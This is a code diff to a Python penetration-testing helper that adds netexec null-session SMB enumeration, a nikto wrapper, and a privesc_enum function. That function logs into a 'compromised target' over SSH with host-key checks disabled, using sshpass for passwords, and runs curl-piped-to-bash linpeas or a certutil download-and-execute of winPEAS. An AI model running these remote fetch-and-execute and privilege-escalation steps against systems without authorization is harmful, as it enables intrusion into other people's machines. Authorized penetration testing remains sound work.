@@ -21,7 +21,7 @@ TOOL_NAMES = [
     "nmap", "feroxbuster", "gobuster", "ffuf", "nikto", "whatweb",
     "searchsploit", "curl", "nc", "sqlmap", "hydra",
     "john", "hashcat", "enum4linux", "smbclient",
-    "netexec", "wfuzz", "dirsearch",
+    "netexec", "wfuzz", "dirsearch", "sshpass",
 ]
 
 
@@ -221,11 +221,50 @@ def subdomain_enum(domain: str, ip: Optional[str] = None, wordlist: str = "/usr/
 
 
 def smb_enum(target: str) -> dict:
+    if shutil.which("netexec"):
+        # netexec is the modern replacement for enum4linux — null session + share enum + RID cycling
+        r = run_command(f"netexec smb {target} -u '' -p '' --shares --users 2>/dev/null", timeout=60)
+        if r["returncode"] == 0 or r["stdout"].strip():
+            return r
     if shutil.which("enum4linux"):
         return run_command(f"enum4linux -a {target}", timeout=120)
     elif shutil.which("smbclient"):
         return run_command(f"smbclient -L //{target} -N", timeout=60)
-    return {"command": "", "stdout": "No SMB enum tool found", "stderr": "", "returncode": -1, "success": False}
+    return {"command": "", "stdout": "No SMB enum tool found (install netexec/enum4linux/smbclient)", "stderr": "", "returncode": -1, "success": False}
+
+
+def nikto_scan(url: str) -> dict:
+    if not shutil.which("nikto"):
+        return {"command": "", "stdout": "nikto not installed", "stderr": "", "returncode": -1, "success": False}
+    return run_command(f"nikto -h {url} -maxtime 120 -nointeractive -Format txt", timeout=150)
+
+
+def privesc_enum(target: str, username: str, password: str = "", os_type: str = "linux") -> dict:
+    """Run linpeas (Linux) or winPEAS (Windows) on a compromised target via SSH."""
+    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"
+
+    if os_type == "linux":
+        run_cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null"
+    else:
+        run_cmd = (
+            "certutil -urlcache -f "
+            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe "
+            "C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe"
+        )
+
+    if password:
+        if not shutil.which("sshpass"):
+            manual = (
+                f"sshpass not found — run manually:\n"
+                f"  scp linpeas.sh {username}@{target}:/tmp/\n"
+                f"  ssh {username}@{target} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"
+            )
+            return {"command": manual, "stdout": manual, "stderr": "", "returncode": 0, "success": True}
+        cmd = f"sshpass -p '{password}' ssh {ssh_opts} {username}@{target} '{run_cmd}'"
+    else:
+        cmd = f"ssh {ssh_opts} {username}@{target} '{run_cmd}'"
+
+    return run_command(cmd, timeout=600)
 
 
 def search_exploit(term: str) -> dict:
@@ -257,6 +296,11 @@ def filter_findings(output: str, command: str = "") -> str:
     if "gobuster" in command:
         # Gobuster finding lines start with "/" or contain "(Status:"
         found = [l for l in lines if l.strip().startswith("/") or "(Status:" in l]
+        return "\n".join(found) if found else output
+
+    if "nikto" in command:
+        # Nikto finding lines start with "+ "
+        found = [l for l in lines if l.strip().startswith("+ ")]
         return "\n".join(found) if found else output
 
     return output
